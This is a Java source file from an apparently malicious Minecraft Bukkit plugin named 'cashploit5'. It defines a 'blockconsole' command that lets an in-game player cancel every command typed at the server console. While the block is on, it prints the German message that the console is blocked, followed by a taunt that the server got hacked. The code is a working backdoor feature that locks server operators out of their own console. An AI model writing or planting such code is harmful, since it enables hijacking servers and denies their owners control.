package de.cashploit5.v1_12_2.command;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

import de.cashploit5.Main;
import de.cashploit5.console.console;

public class BlockConsoleCommand extends Command implements Listener {

	public BlockConsoleCommand() {
		super("blockconsole");
		Bukkit.getPluginManager().registerEvents(this, Main.getPlugin());
	}
	
	private static boolean isBlocked = false;
	
	@Override
	public void onCommand(Player p, Command command, String[] args) {
		isBlocked = !isBlocked;
		if(isBlocked) {
			Main.sendMessage(p, "§aDie Konsole wurde blockiert");
		} else {
			Main.sendMessage(p, "§aDie Konsole wurde entblockt!");
		}
	}
	
	@EventHandler(priority=EventPriority.LOWEST)
	public void onServerCommand(ServerCommandEvent e) {
		if(isBlocked) {
			e.setCancelled(true);
			console.send("§cDie Konsole wurde blockiert! HAHAHHAHAHAHAHAHAhAHAhAAHAHHA SeRvEr GeT hAcKeD rOfL lOl uwu");
		}
	}
}
